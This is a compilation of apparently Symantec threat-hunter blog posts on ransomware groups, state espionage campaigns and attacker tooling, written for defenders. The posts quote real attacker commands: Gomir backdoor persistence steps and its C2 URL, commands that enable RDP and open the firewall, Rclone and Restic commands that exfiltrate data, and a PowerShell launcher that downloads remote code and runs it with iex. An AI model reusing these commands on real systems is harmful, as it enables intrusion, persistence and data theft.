in in 2023 was theexploitation of vulnerabilities in Progress Software’s MOVEit Transfer managed file-transfer application. However, in recent weeks Symantec’s Threat Hunter Team has seen the Clop payload being used once again, suggesting that Snakefly is returning to mounting conventional double extortion attacks. Bring-Your-Own-Vulnerable-Driver (BYOVD) continues to be a favored tactic among ransomware groups, particularly as a means of disabling security solutions. Since drivers are signed and can obtain kernel access, they are frequently used to kill processes. A correctly written driver will contain checks to ensure that only the software it’s designed to work with is issuing commands and that it’s only used for its intended purpose. A vulnerable driver, in the wrong hands, becomes a de facto privilege escalation tool. The most recently seen tool in this category is Warp AV Killer, which has been used by at least one LockBit affiliate in recent weeks and leverages a vulnerable Avira anti-rootkit driver to disable security products. Although ransomware operations have experienced a high level of disruption to date in 2024, the impact on activity levels has been relatively limited. Ransomware is likely to continue as one of the main threats faced by enterprises for the foreseeable future. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "Attackers using tools associated with Chinese espionage groups have breached multiple telecom operators in a single Asian country in a long-running espionage campaign. The attackers placed backdoors on the networks of targeted companies and also attempted to steal credentials. The attacks have been underway since at least 2021, with evidence to suggest that some of this activity may even date as far back as 2020. Virtually all of the organizations targeted were telecoms operators, with the addition of a services company that serves the telecoms sector and a university in another Asian country. Custom malware associated with a number of China-linked espionage actors was used in the campaign, including: Coolclient:A backdoor associated with the Fireant group (aka Mustang Panda, Earth Preta). Its functionality includes logging keystrokes, reading and deleting files, and communication with a command and control (C&C) server. Variants of the backdoor used in this campaign were similar to onedocumented by Trend in 2023. A version of the legitimate VLC Media Player masquerading as a Google file (googleupdate.exe) was used to sideload a Coolclient loader (file name: libvlc.dll). The loader reads an encrypted payload from a file named loader.ja. This payload will in turn read a second encrypted payload from a file named goopdate.ja and inject it into the winver.exe process. Quickheal:A backdoor that has been long associated with the Neeedleminer group (aka RedFoxtrot, Nomad Panda). The variant of Quickheal used in this campaign was a 32-bit DLL named RasTls.dll, which had an export named GetOfficeDatatal. Analysis of the malware revealed that it was almost identical to Quickheal variantsdocumented by Recorded Future in 2021, the only differences being new configuration details in the compiled code and VMProtect obfuscations. The backdoor communicated with a hardcoded C&C server named swiftandfast.net using TCP port 443. It used a custom communications protocol that was designed to look like SSL traffic but used its own encryption instead. Rainyday:A backdoor associated with the Firefly group (aka Naikon). Most of the Rainyday variants used during the campaign were executed using a loader named fspmapi.dll. The loader is sideloaded using a legitimate F-Secure executable named fsstm.exe. When loaded, it obtains the disk folder of the executable that started the process and sets it as the current directory. It then obtains the memory location of the executable and patches its memory image. This appears to be done in order to hijack the execution flow when the malware is loaded by a certain executable. If the hijack is successful, the loader reads from a file called dataresz, decrypts the payload with a single byte XOR key (0x2D) and executes it as shellcode. Minor variants of the above include one with an invalid digital signature by \"Kaspersky Lab\" and another whose loader reads the encrypted shellcode from a file named iReports. Another variant is executed using a loader named security.dll. It is sideloaded using an executable called msproxy.exe,which is an application called Proxifier, developed by Initex. The executable’s default name is ProxyChecker.exe and was likely renamed to masquerade as a Microsoft file. In this case, the loader reads the encrypted shellcode from a file named nod193100. The XOR key used is also different: 0xF6. Two files with the name nod193100 found on VirusTotal were, on analysis, found to be similar to a loader used for the Rainyday backdoordocumented by Bitdefender in 2021. Aside from the custom backdoors mentioned above, the attackers used a variety of other tactics, techniques, and procedures (TTPs): Tools used in this campaign have strong associations with multiple Chinese groups and at least three of the custom backdoors deployed are believed to be used exclusively by Chinese espionage actors. Coolclient is tied to the Fireant group while Quickheal is associated with the Needleminer group. Rainyday, meanwhile, has always been used by the Firefly group. All three groups are widely considered by multiple security firms, including Symantec, to be operating from China. The United States–China Economic and Security Review Commission, an independent advisory body established by the U. S. Congress,has described Fireflyas an \"APT possibly associated with Unit 78020 (PLA) that operates in the southern theater command’s area of responsibility (AOR).\" The nature of the link between the actors involved in the current campaign remains unclear. Possibilities include, but are not limited to: The ultimate motive of the intrusion campaign remains unclear. The attackers may have been gathering intelligence on the telecoms sector in that country. Eavesdropping is another possibility. Alternatively, the attackers may have been attempting to build a disruptive capability against critical infrastructure in that country.

However, analysis of an exploit tool deployed in recent attacks revealed evidence that it could have been compiled prior to patching, meaning at least one group may have been exploiting the vulnerability as a zero-day. The exploit tool was deployed in a recent attempted ransomware attack investigated by Symantec’s Threat Hunter Team. Although the attackers did not succeed in deploying a ransomware payload in this attack, the tactics, techniques, and procedures (TTPs) used were highly similar to those described in arecent Microsoft report detailing Black Basta activity. These included the use of batch scripts masquerading as software updates. Although no payload was deployed, the similarities in TTPs makes it highly likely it was a failed Black Basta attack. Analysis of the exploit tool revealed that it takes advantage of the fact that the Windows file werkernel.sys uses a null security descriptor when creating registry keys. Because the parent key has a “Creator Owner” access control entry (ACE) for subkeys, all subkeys will be owned by users of the current process. The exploit takes advantage of this to create a \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe\" registry key where it sets the \"Debugger\" value as its own executable pathname. This allows the exploit to start a shell with administrative privileges. The variant of the tool used in this attack (SHA256: 4aae231fb5357c0647483181aeae47956ac66e42b6b134f5b90da76d8ec0ac63) had a compilation time stamp of February 27, 2024, several weeks before the vulnerability was patched. A second variant of the tool discovered on Virus Total (SHA256: b73a7e25d224778172e394426c98b86215087d815296c71a3f76f738c720c1b0) had an earlier compilation time stamp of December 18, 2023. Time stamp values in portable executables are modifiable, which means that a time stamp is not conclusive evidence that the attackers were using the exploit as a zero-day. However, in this case there appears to be little motivation for the attackers to change the time stamp to an earlier date. Cardinal introduced Black Basta in April 2022 and from its inception, the ransomware was closely associated with the Qakbot botnet, which appeared to be its primary infection vector. Qakbot was one of the world’s most prolific malware distribution botnets until itwas taken down following law enforcement action in August 2023. However, while the takedown led to a dip in Black Basta activity, Cardinal has since resumed attacks andnow appears to have switched to working with the operators of the DarkGate loaderto obtain access to potential victims.

    "text": "RansomHub, a new Ransomware-as-a-Service (RaaS) that has rapidly become one of the largest ransomware groups currently operating, is very likely an updated and rebranded version of the older Knight ransomware. Analysis of the RansomHub payload by Symantec, part of Broadcom, revealed a high degree of similarity between the two threats, suggesting that Knight was the starting point for RansomHub. Despite shared origins, it is unlikely that Knight’s creators are now operating RansomHub. Source code for Knight (originally known as Cyclops) wasoffered for sale on underground forums in February 2024after Knight’s developers decided to shut down their operation. It is possible that other actors bought the Knight source code and updated it before launching RansomHub. Both payloads are written in Go and most variants of each family are obfuscated withGobfuscate. Only some early versions of Knight are not obfuscated. The degree of code overlap between the two families is significant, making it very difficult to differentiate between them. In many cases, a determination could only be confirmed by checking the embedded link to the data leak site. The two families have virtually identical help menus available on the command line. The sole difference is the addition of a sleep command in RansomHub. Both threats employ a unique obfuscation technique, where important strings are each encoded with a unique key and decoded at runtime. For example, in the command “cmd.exe /c iisreset.exe /stop”, only the iisrest.exe string is encrypted with a unique key. There are significant similarities between the ransom notes left by both payloads, with many phrases used by Knight appearing verbatim in the RansomHub note, suggesting that the developers simply edited and updated the original note. One of the main differences between the two ransomware families is the commands run through cmd.exe. These commands may be configured when the payload is built or during configuration. Although the commands themselves are different, the way and order in which they are called relative to other operations is the same. A unique feature present in both Knight and RansomHub is the ability to restart an endpoint in safe mode before starting encryption. This technique was previously employed by Snatch ransomware in 2019 and allows encryption to progress unhindered by operating system or other security processes. Snatch is also written in Go and has many similar features, suggesting it could be another fork of the same original source code used to develop Knight and RansomHub. However, Snatch contains significant differences, including an apparent lack of configurable commands or any sort of obfuscation. Another ransomware family thatrestarts the affected computer in safe mode before encryption is NoberusInterestingly, the encryptor stores its configuration in a JSONwhere keywords match what was observed in RansomHub. In recent RansomHub attacks investigated by Symantec, the attackers gained initial access by exploiting the Zerologon vulnerability (CVE-2020-1472), which can allow an attacker to gain domain administrator privileges and take control of the entire domain. The attackers used several dual-use tools before deploying the ransomware. Atera and Splashtop were used to facilitate remote access, while NetScan was used to likely discover and retrieve information about network devices. The RansomHub payload leveraged the iisreset.exe and iisrstas.exe command-line tools to stop all Internet Information Services (IIS) services. Despite only first appearing in February 2024, RansomHub has managed to grow very quickly and, over the past three months, was the fourth most prolific ransomware operator in terms of numbers of attacks publicly claimed. The group last weekclaimed responsibility for an attack on UK auction house Christies. One factor contributing to RansomHub’s growth may be the group’s success in attracting some large former affiliates of the Noberus (aka ALPHV, Blackcat) ransomware group, which closed earlier this year. One former Noberus affiliate known as Notchyis now reportedly working with RansomHub. In addition to this, tools previously associated with another Noberus affiliate known as Scattered Spider, were used in a recent RansomHub attack. The speed at which RansomHub has established its business suggests that the group may consist of veteran operators with experience and contacts in the cyber underground.

    "text": "Symantec’s Threat Hunter Team has uncovered a new Linux backdoor developed by the North Korean Springtail espionage group (aka Kimsuky) that is linked to malware used in a recent campaign against organizations in South Korea. The backdoor (Linux. Gomir) appears to be a Linux version of the GoBear backdoor, which was used in a recent Springtail campaign that saw the attackers deliver malware via Trojanized software installation packages. Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants. Springtail is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean governmentsaid it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U. S. government has said that the group is a unit of North Korea’s military intelligence organization, the Reconnaissance General Bureau (RGB). The group was the subject of a U. S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts. According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U. S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs “with credible links to North Korean policy circles”. The campaign,which was first documented by South Korean security firm S2W in February 2024, saw Springtail deliver a new malware family named Troll Stealer using Trojanized software installation packages. Troll Stealer can steal a range of information from infected computers including files, screenshots, browser data, and system information. Written in Go, like many newer Springtail malware families, Troll Stealer contained a large amount of code overlap with earlier Springtail malware. Troll Stealer’s functionality included the ability to copy the GPKI (Government Public Key Infrastructure) folder on infected computers. GPKI is the public key infrastructure schemafor South Korean government personnel and state organizations, suggesting that government agencies were among the targets of the campaign. S2W reported that the malware was distributed inside installation packages for TrustPKI and NX_PRNMAN, software developed by SGA Solutions. The installation packages were reportedly downloaded from a page that was redirected from a specific website. South Korean security firm AhnLabsubsequently provided further detailson the downloads, saying they originated from the website of an association in the construction sector. The website required users to log in and the affected packages were among those users had to install to do so. Symantec has since discovered that Troll Stealer was also delivered in Trojanized Installation packages for Wizvera VeraPort. It is unclear how these installation packages were delivered during the current campaign. Wizvera VeraPort waspreviously reported to have been compromisedin a North Korea-linked software supply chain attack in 2020. Troll Stealer appears to be related to another recently discovered Go-based backdoor named GoBear. Both threats are signed with a legitimate certificate issued to “D2innovation Co.,LTD”. GoBear also contains similar function names to an older Springtail backdoor known as BetaSeed, which was written in C++, suggesting that both threats have a common origin. AhnLab later explicitly linked the two threats, saying that many of the malicious installers it had analyzed contained both Troll Stealer and either of the GoBear or BetaSeed backdoors, which it referred to as the Endoor malware family. Several weeks later, GoBear was being distributed by a dropper masquerading as an installer for an app for a Korean transport organization. In this case, the attackers did not Trojanize a legitimate software package but instead disguised the dropper as an installer featuring the organization’s logos. The dropper was signed with what appeared to be a stolen certificate. Symantec’s investigation into the attacks uncovered a Linux version of this malware family (Linux. Gomir) which is structurally almost identical and shares an extensive amount of distinct code with the Windows Go-based backdoor GoBear. Any functionality from GoBear that is operating system-dependent is either missing or reimplemented in Gomir. When executed, it checks its command line and if contains the string “install” as its only argument, it will attempt to install itself with persistence. To determine how it installs itself, Gomir checks the effective group ID (as reported by the getegid32() syscall) of its own process. If the process is running as group 0, Gomir assumes that it is running with superuser privileges and attempts to copy itself as the following file: It then attempts to create a systemd service with the name \"syslogd\" by creating the file: /etc/systemd/system/syslogd.service ExecStart=/bin/sh -c \"/var/log/syslogd\" WantedBy=multi-user.target Gomir will then enable and start the created service by executing the following sequence of commands: ${SHELL} -c systemctl daemon-reload ${SHELL} -c systemctl reenable syslogd ${SHELL} -c systemctl start syslogd It will then delete the original executable and terminate the original process. If the process is running as any group other than 0, Gomir attempts to configure a crontab to start the backdoor on every reboot. It first creates a helper file (cron.txt) in the current working directory with the following content: @reboot [PATHNAME_OF_THE_EXECUTING_PROCESS] Next, it seems to attempt to list any pre-existing crontab entries by running the following command: /bin/sh -c crontab -l It appends the output to the created helper file. Gomir then updates the crontab configuration by executing the following command: ${SHELL} -c crontab cron.txt Gomir then deletes the helper file before executing itself without any command-line parameters. Once installed and running, Gomir periodically communicates with its command-and-control (C&C) server by sending HTTP POST requests to: http://216.189.159[.]34/mir/index.php When pooling for commands to execute, Gomir requests with the following HTTP request body: a[9_RANDOM_ALPHANUMERIC_CHARACTERS]=2&b[9_RANDOM_ALPHANUMERIC_CHARACTERS]=[INFECTION_ID]1&c[9_RANDOM_ALPHANUMERIC_CHARACTERS]= The INFECTION_ID is generated using the following method: def generate_infection_id(hostname, username): hexdigest = hashlib.md5(hostname + username).hexdigest() return \"g-\" + hexdigest[:10] The expected body of the HTTP server response is a string starting with the letter S. Gomir then attempts to decode the remaining characters of the string using the Base64 algorithm. The decoded blob has the following structure: Gomir then uses a custom encryption algorithm to decrypt the previously discussed command. The first two characters of the command identify the operation to execute. Gomir allows the execution of 17 different commands. The commands are almost identical to those supported by the GoBear Windows backdoor: This latest Springtail campaign provides further evidence that software installation packages and updates are now among the most favored infection vectors for North Korean espionage actors. Variations of this tactic include: The most notable example to date is the3CX supply chain attack, which itself was the result of the earlierX_Trader supply chain attack. Springtail, meanwhile, has focused on Trojanized software installers hosted on third-party sites requiring their installation or masquerading as official apps. The software targeted appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets.

The malware found in Ukraine appeared to be named BirdyClient or OneDriveBirdyClient by its developers because references to both names were found in its code. Its file name—vxdiff.dll—was the same as a legitimate DLL associated with an application called Apoint (apoint.exe), which is driver software for Alps pointing devices, usually found in laptops. Whether the malware was simply masquerading as a legitimate file or whether it was being sideloaded by Apoint remains unknown. Analysis of the BirdyClient malware (Trojan. BirdyClient) revealed that its main functionality is to connect to the Microsoft Graph API and use Microsoft OneDrive as a C&C server mechanism to upload and download files from it. The sample also creates the following log file: %AllUsersProfile%/{0134AA2C-03BE-448D-8D28-7FFE94EA3A49}/config/001.temp To date, no related tools have been found. It remains unclear who the developers of the threat are and what their motivation is. Graph is a Microsoft API designed to allow developers to access resources hosted on Microsoft cloud services, such as Microsoft 365. Authentication is carried out using OAuth access tokens. Graph can be used to access a wide range of data and services such as email, calendar events, files, or devices. Application developers can potentially use it to pull data from one or more Microsoft services and integrate it into their own solutions. BirdyClient is the latest threat seen leveraging the Graph API. The first known usage was by the North Korea-linked Vedalia espionage group (aka APT37), which developed Bluelight, a second-stage payload that could communicate with several different cloud services for C&C purposes. According to Volexity, which discovered Bluelight, the variant it analyzed used the Graph API to communicate with OneDrive. In October 2021,Symantec uncovered the Harvester group, a nation-state-backed espionage operation, targeting organizations in South Asia. Its toolset included a custom backdoor called Backdoor. Graphon that used the Graph API to communicate with Microsoft infrastructure for C&C purposes. The technique came to further public attention in January 2022,with the discovery of Graphite—malware that used the Graph API to communicate with a OneDrive account that was acting as a C&C server. Graphite was deployed in a campaign against several governments in Europe and Asia. Attacks began with spear-phishing emails that delivered an Excel downloader containing a remote code execution exploit (CVE-2021-40444). This led to the installation of a second-stage downloader, followed by Graphite and a secondary payload—PowerShell Empire. The campaign was eventually linked to the Russian Swallowtail espionage group (aka APT28, Fancy Bear). Other espionage groups appeared to be quick to learn from early users and began leveraging the Graph API in their toolset. In December 2022, Elastic Securitydocumented an intrusion into the Foreign Affairs Office of an ASEAN member. Among the tools deployed was SiestaGraph, which used the Graph API to interact with both OneDrive and Microsoft 365 Mail for C&C purposes. SiestaGraph appears to be in continuous development. In September 2023, Symantec found a new variant of the malware that contained different command identifiers from those originally documented. In June 2023,Symantec discovered Backdoor. Graphican, which was being used by the Flea (aka APT15, Nickel) advanced persistent threat (APT) group in an espionage campaign heavily focused on foreign affairs ministries in the Americas. Graphican is an evolution of an older Flea backdoor known as Ketrican, which itself was based on a previous malware—BS2005—that was also used by Flea. Graphican has the same functionality as Ketrican, but its new features included the use of the Microsoft Graph API and OneDrive to obtain its C&C infrastructure. Others are learning from its use in the wild. For example, penetration-testing firm RedSiegerecently announced the development of GraphStrike, a toolset that works with Cobalt Strike to enable the Cobalt Strike Beacon payload to use the Graph API for HTTPS C&C communications. Attacker communications with C&C servers can often raise red flags in targeted organizations. The Graph API’s popularity among attackers may be driven by the belief that traffic to known entities, such as widely used cloud services, is less likely to raise suspicions. In addition to appearing inconspicuous, it is also a cheap and secure source of infrastructure for attackers since basic accounts for services like OneDrive are free. As awareness grows of this tactic, the number of attackers attempting to leverage Graph may grow further. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "Ransomware activity remains on an upward trend despite the number of attacks claimed by ransomware actors decreasing by slightly more than 20% in the fourth quarter of 2023. Attackers have continually refined their tactics and proven quick to respond to disruption, finding new ways to infect victims. Analysis of data from ransomware leak sites shows that attackers managed to hit significantly more victims last year (4,700) compared to 2022 (2,800). While the shutdown of the Qakbot botnet in June 2023 took a major malware distribution channel offline, attackers have quickly adapted and vulnerability exploitation now appears to be the primary vector for ransomware attacks. LockBit, the longstanding ransomware-as-service operation run by the Syrphid cybercrime group (aka Bitwise Spider), continued to be the largest ransomware threat in 2023, accounting for 21% of all attacks claimed on data leak sites. It was followed by Noberus (aka BlackCat, ALPHV) with 9% of all claimed attacks and Clop with 8%. BothLockBitandNoberushave been the target of law enforcement operations in recent weeks and it remains to be seen if these will significantly impact on activity levels from both threats over the long term. Interestingly, there are significant disparities between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit was responsible for over 21% of the 4,700 attacks claimed in 2023, they were only identified as being involved in around 17% of the attacks Symantec investigated. Conversely, Noberus claimed 9% of all attacks in 2023 but it was involved in a little over 20% of all attacks Symantec investigated. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that Noberus affiliates are more likely to advance their attacks at least to the payload deployment stage. The evidence from recent ransomware investigations suggests that exploitation of known vulnerabilities in public facing applications is now the main vector for ransomware attacks. Likely infection vectors in recent ransomware attacks include: The number of tools deployed by ransomware actors continues to grow. In particular, there has been a marked increase in the number of dual-use tools (legitimate software installed by attackers for malicious purposes). Tools leveraging the Bring Your Own Vulnerable Driver (BYOVD) technique are also currently popular among attackers. New tools recently seen in ransomware attacks include: Noteworthy techniques that have recently been used by ransomware actors include: Ransomware will continue to be a major threat for organizations in 2024 and beyond. Incentivised by large payouts, ransomware attackers have proven to be persistent and adaptive, capable of responding to disruption by reorganizing themselves and consistently developing new tactics.

    "text": "Ransomware actors are deploying a growing array of data-exfiltration tools in their attacks and, over the past three months alone, Symantec has found attackers using at least dozen different tools capable of data exfiltration. While some exfiltration tools are malware, the vast majority are dual-use – legitimate software used by the attackers for malicious purposes. Double extortion attacks are now standard practice for most ransomware operators. In addition to encrypting files, attackers steal data from victims and threaten to release it unless the ransom is paid. The tactic has proven to be effective, supplying attackers with more leverage to use against organizations that may be able to restore encrypted files from backups. The range of tools now being used by ransomware actors for exfiltration is growing. It would appear that this trend is driven by two factors: A growing awareness among attackers of the potential functionality in certain types of software; and a desire to find lesser-known alternatives to tools that have gained a reputation for malicious usage. While Rclone is still the most frequently used exfiltration tool by ransomware actors, the fastest growing category is remote administration and remote management tools, such as AnyDesk, ScreenConnect, and Atera. The functionality of these tools lies behind their appeal to attackers, since exfiltration is just one of their capabilities and most can act as a de-facto backdoor on a compromised computer. The most frequently used exfiltration tools over the past three months include: Rclone:Open-source toolthat can legitimately be used to manage content in the cloud, but has been seen being abused by ransomware actors to exfiltrate data from victim machines. For an example of how Rclone may be used, see case study below. AnyDesk: A legitimateremote desktop application. By installing it, attackers can obtain remote access to computers on a network. Malicious usage of AnyDesk is now a well-known TTP and, in some cases, attackers will attempt to avoid raising suspicions by renaming the AnyDesk executable to something that may appear more innocuous, a technique known as masquerading. RDP: Remote Desktop Protocol. A Microsoft-developed protocol that allows a computer to connect to and control another computer, using client/server software. Attackers can attempt to enable RDP using a variety of techniques, including leveraging multiple living-off-the-land tools. Once RDP is enabled, it allows the attackers to use any number of dual-use tools that leverage the RDP protocol. For example, an attacker may attempt to enable RDP by simply modifying a registry key: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f The attacker may also attempt to create a firewall rule to specifically allow all incoming RDP connections using a Network Shell (netsh) command: netsh advfirewall firewall add rule name=[NAME] RemoteDesktop\" dir=in protocol=TCP localport=3389 action=allow Cobalt Strike: An off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files. It ostensibly has legitimate uses as a penetration-testing tool but is invariably exploited by malicious actors. Cobalt Strikes has been used for data exfiltration, with attackers leveraging Cobalt Strike's Beacon payload to establish covert communication channels with compromised systems, allowing them to exfiltrate sensitive data stealthily. The tool's ability to mimic normal network traffic and blend in with legitimate activity enables attackers to surreptitiously transfer valuable information from compromised networks. ScreenConnect:Aremote desktop application tool by ConnectWise, used to enable remote access to computers. Atera:Legitimate remote monitoring and access software. It and similar tools are often used by attackers to obtain remote access to computers on a network. WinRAR:Anarchive managerthat can be used to archive or zip files. Attackers have used WinRAR and similar utilities (e.g. 7-Zip) in order to prepare files for exfiltration: cmd /u [REMOVED] CSIDL_COMMON_APPDATA\\rar.exe a -dh -hp[REMOVED] -m5 CSIDL_COMMON_APPDATA\\1.rar CSIDL_COMMON_APPDATA\\1.txt > CSIDL_COMMON_APPDATA\\log.txt Restic:Open-sourcecommand line backup tooldesigned to be efficient and secure and will work with various platforms including Windows, Linux, and OSX. Restic supports various storage backends, including local directories, SFTP servers, Amazon S3, Microsoft Azure, and Google Cloud Storage, which has made it a popular choice for ransomware actors. The following is an example of Restic commands used by attackers using the Noberus ransomware. The “init” command initializes a new repository. The “-r” switch specifies the repository to backup to or restore from, while the “-use-fs-snapshot” switch instructs the application to use the file system snapshot where possible. CSIDL_COMMON_VIDEO\\restic.exe -r rest:http://[REMOVED]:8000/ init [REMOVED] CSIDL_COMMON_VIDEO\\ppp.txtCSIDL_COMMON_VIDEO\\restic.exe -r rest:http://[REMOVED]:8000/ [REMOVED] CSIDL_COMMON_VIDEO\\ppp.txt --use-fs-snapshot --verbose backup \"CSIDL_SYSTEM_DRIVE\\[REMOVED]\" TightVNC:Open-sourceremote desktop software. WinSCP:Alegitimate SFTP client and FTP clientfor Microsoft Windows. Pandora RC:Pandora Remote control (formerly known as eHorus) is a legitimate remote access tool that is sold commercially and has agents for Windows, Linux, and Mac workstations. It has also been leveraged by attackers, mainly to facilitate remote access and deployment of additional tools to assist in credential dumping and lateral movement. However, Pandora RC may also be used to facilitate exfiltration of sensitive information from targeted organizations. The remote management platform can be used from any device with a web browser. Chisel:Chisel is anopen-source proxy tool. It was designed to create encrypted, tunnelled connections, commonly used in network security testing and penetration testing scenarios. However, it has been abused during ransomware attacks to create tunnels to attacker-controlled infrastructure as part of data exfiltration activities. It creates a TCP/UDP tunnel that is transported over HTTP and secured via SSH. PowerShell:Microsoft scripting toolthat can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance. In several ransomware attacks, the attackers have executed specific commands in order to facilitate data exfiltration, including use of the Compress-Archive cmdlet: powershell Compress-Archive CSIDL_PROFILE\\public\\[REMOVED]-fs CSIDL_PROFILE\\public\\[REMOVED]-fs.zip Rclone is anopen-source toolwhose legitimate uses include online backups and managing content in the cloud. Ransomware attackers use its capabilities to exfiltrate data from compromised networks. It is usually installed by the attackers themselves once they have infiltrated a targeted network. Rclone is now so frequently used by ransomware groups that many attackers will now rename Rclone to masquerade as something else (e.g. svchost.exe). A RagnarLocker attack which occurred in July 2023 provides an example of how Rclone can be used by ransomware actors. The first evidence of malicious activity occurred when PowerShell commands were executed to disable Local Security Authority (LSA) protection. The attackers then ran SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for the discovery of host names and network services. The next day, the attackers resumed their activity, deploying Mimikatz and LaZagne to dump credentials, before using a number of living-off-the-land tools to gather system information, save registry hives, execute commands on other computers on the network, and enable the Remote Desktop Protocol (RDP) to facilitate remote access. The attackers then began using Rclone to copy data from network shares, e.g. rclone copy \\\\[REMOVED]\\[REMOVED]\\Shares --max-age 2095d [REMOVED]:[REMOVED]/ -P --exclude \"*.{zip,log,rar,wav,mp4,mpeg}\" --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 Interestingly, there were frequent typos in the commands issued by the attackers, suggesting hands-on-keyboard activity rather than automation. The attackers then initiated Rclone connections to the Put.io file-sharing service, which acted as the destination for the exfiltrated data: https://s100.put[.]io https://s101.put[.]io https://s102.put[.]io https://s103.put[.]io https://upload.put[.]io Once the data was exfiltrated, the attackers moved on to the next stage of the attack, deployment of the RagnarLocker payload and encryption of files. Data exfiltration is now a key step in the attack chain for most ransomware actors and many see stolen data as their most effective way of extorting organizations, creating darknet data leak sites naming their victims and publishing stolen data if a ransom isn’t paid. While some malware is still being authored for this purpose, many attackers are turning to legitimate software packages in the belief that they are less likely to trigger alerts when deployed on their victims’ networks.

Analysis of Alpha reveals significant similarities with the old NetWalker ransomware. Both threats use a similar PowerShell-based loader to deliver the payload. In addition to this, there is a significant amount of code overlap between the Alpha and NetWalker payloads. This includes: While Alpha first appeared in February 2023, it maintained a low profile until recent weeks when it appeared to begin scaling up its operations and launching a data leak site. In recent attacks involving Alpha, the attackers made heavy use of a number of living-off-the-land tools, including: NetWalker was part of the first wave of cybercrime operations to profit from targeted ransomware attacks, where attackers attempt to encrypt entire networks in order to extort their victims. One jailed group member alone is alleged to have earned over $27.6 million from attacks. Following the law enforcement operation and long cessation of activity, it had been assumed that NetWalker had completely departed. However, the similarities between Alpha and the NetWalker ransomware suggest a strong link between the two threats. Alpha may be an attempt at reviving the old ransomware operation by one or more of the original NetWalker developers. Alternatively, the attackers behind Alpha may have acquired and modified the original NetWalker payload in order to launch their own ransomware operation.

    "text": "Although we are just a few weeks into the new year, ransomware attacks – and their costly impact on today’s enterprises – are already makingheadlines. According to our new report,The 2024 Ransomware Threat Landscape, published today by the Symantec Threat Hunter Team, part of Broadcom, “ransomware continues to be one of the most lucrative forms of cybercrime and, as such, remains a critical threat for organizations of all sizes.” The new report analyzes the ransomware threat landscape over the past 12 months, from new operators in the field to attackers’ top tools and tactics, techniques, and procedures (TTPs) and providesactionableintelligence – including real-world attacker case studies – that can help organizations stop attacks early in the attack chain. Among the report’s key findings: Based on these findings and other intelligence, we can expect the following ransomware trends to continue through 2024 and beyond: One thing we know for certain – ransomware will remain a persistent threat to all organizations, regardless of size. To help mitigate this risk, organizations should adopt a defense-in-depth strategy, using multiple detection, protection, and hardening technologies to mitigate risk at each point of a potential attack chain. In addition, organizations should prioritize deepening their knowledge of current infection vectors used and commonly employed in ransomware attacks. This information will assist in prioritizing and identifying potential areas of weakness and help strengthen a defensive posture. As a result, defenders increasingly are turning toSymantec Adaptive Protectionin their fight against ransomware. To help close the attack routes available using living-of-the-land tools, Symantec Adaptive Protection maps out the different attack methods used by attackers and displays this data in the form of a heatmap for quick reference. Incident responders can leverage this data to understand which living-of-the-land tools are being used in various different attacks such as advanced persistent threats (APTs) and ransomware. Symantec is currently tracking 70 specific behaviors across 54 living-of-the-land tools and is uniquely positioned to quickly react and update this data based off the changing landscape. Next month, we will be publishing a paper focusing on how Adaptive Protection strategies increase efficacy and efficiency. Check back with us for more details in the coming weeks. What was our team’s number one learning about ransomware in 2023? The ransomware cybercrime ecosystem is highly durable and continues to survive disruption from law enforcement and other efforts. Yet, the good news is that there are steps you can take today to reduce the risk of ransomware. By combining actionable intelligence about ransomware attackers TTPs with Symantec Adaptive Protection, defenders can better understand how their organizations might be compromised – and take the necessary steps to protect against it.

    "text": "Iranian espionage group Seedworm (aka Muddywater) has been targeting organizations operating in the telecommunications sector in Egypt, Sudan, and Tanzania. Seedworm has been active since at least 2017, and has targeted organizations in many countries, though it is most strongly associated with attacks on organizations in the Middle East. It has beenpublicly statedthat Seedworm is a cyberespionage group that is believed to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS). The attackers used a variety of tools in this activity, which occurred in November 2023, including leveraging the MuddyC2Go infrastructure, which was recentlydiscovered and documented by Deep Instinct. Researchers on Symantec’s Threat Hunter Team, part of Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated. The attackers also use the SimpleHelp remote access tool and Venom Proxy, which have previously been associated with Seedworm activity, as well as using a custom keylogging tool, and other publicly available and living-off-the-land tools. The attacks in this campaign occurred in November 2023. Most of the activity we observed occurred on one telecommunications organization. The first evidence of malicious activity was some PowerShell executions related to the MuddyC2Go backdoor. A MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder “csidl_common_appdata\\javax”, which seems to have been sideloaded by jabswitch.exe. Jabswitch.exe is a legitimate Java Platform SE 8 executable. The MuddyC2Go launcher executed the following PowerShell code to connect to its command-and-control (C&C) server: tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=\"tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp\";$uri =\"http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response. Content; It appears that the variables at the beginning of the code are there for the purposes of attempting to bypass detection 